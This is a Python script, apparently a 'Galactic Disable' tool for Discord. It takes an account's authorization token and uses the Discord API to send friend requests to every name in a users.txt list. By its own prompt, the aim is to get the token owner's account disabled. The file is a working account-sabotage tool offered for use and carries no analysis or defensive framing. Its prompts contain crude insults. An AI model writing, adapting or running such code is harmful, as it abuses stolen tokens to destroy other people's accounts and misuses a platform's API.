import requests
import os

from colorama import Fore, init

init(convert=True)
clear = lambda: os.system('cls')

def starter():
    clear()
    cc = f'''

 ██████╗  █████╗ ██╗      █████╗  ██████╗████████╗██╗██████╗ ██╗███████╗ █████╗ ██████╗ ██╗     ███████╗
██╔════╝ ██╔══██╗██║     ██╔══██╗██╔════╝╚══██╔══╝██║██╔══██╗██║██╔════╝██╔══██╗██╔══██╗██║     ██╔════╝
██║  ███╗███████║██║     ███████║██║        ██║   ██║██║  ██║██║███████╗███████║██████╔╝██║     █████╗  
██║   ██║██╔══██║██║     ██╔══██║██║        ██║   ██║██║  ██║██║╚════██║██╔══██║██╔══██╗██║     ██╔══╝  
╚██████╔╝██║  ██║███████╗██║  ██║╚██████╗   ██║   ██║██████╔╝██║███████║██║  ██║██████╔╝███████╗███████╗
 ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝   ╚═╝   ╚═╝╚═════╝ ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝ ╚══════╝╚══════╝
                                                                                                        
     
    '''.replace('▒', f'{Fore.BLUE}▒{Fore.RESET}').replace('░', f'{Fore.BLUE}░{Fore.RESET}').replace('▒', f'{Fore.BLUE}▒{Fore.RESET}')
    return cc

def disable():
    print(starter())
    input(f"[{Fore.BLUE}!{Fore.RESET}] {Fore.LIGHTBLACK_EX}Press Enter To Start!{Fore.RESET}")
    token = input(f"[{Fore.GREEN}>{Fore.RESET}] {Fore.LIGHTBLACK_EX}Enter da Token (without Quotes u greasy fuck):{Fore.RESET} ")
    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    res = requests.get('https://discord.com/api/v8/users/@me', headers=headers).json()
    print(f"[{Fore.GREEN}!{Fore.RESET}] {Fore.LIGHTBLACK_EX}User Details: {res['username']} ({res['id']}){Fore.RESET}")
    input(f"[{Fore.RED}!{Fore.RESET}] {Fore.LIGHTBLACK_EX}If These Details Are Correct Press Enter! (This Will Start Disbaling The Account){Fore.RESET}")
    for username in open('users.txt', 'r').read().splitlines():
        try:
            usr = username.split('#')
            r = requests.post('https://discord.com/api/v8/users/@me/relationships', headers=headers, json={'username': usr[0], 'discriminator': usr[1]})
            print(f"[{Fore.GREEN}{r.status_code}{Fore.RESET}] {Fore.LIGHTBLACK_EX}{usr[0]}#{usr[1]} Added!{Fore.RESET}")
        except:
            print(f"[{Fore.RED}!{Fore.RESET}]{Fore.LIGHTBLACK_EX} Something Went Wrong!{Fore.RESET}")

disable()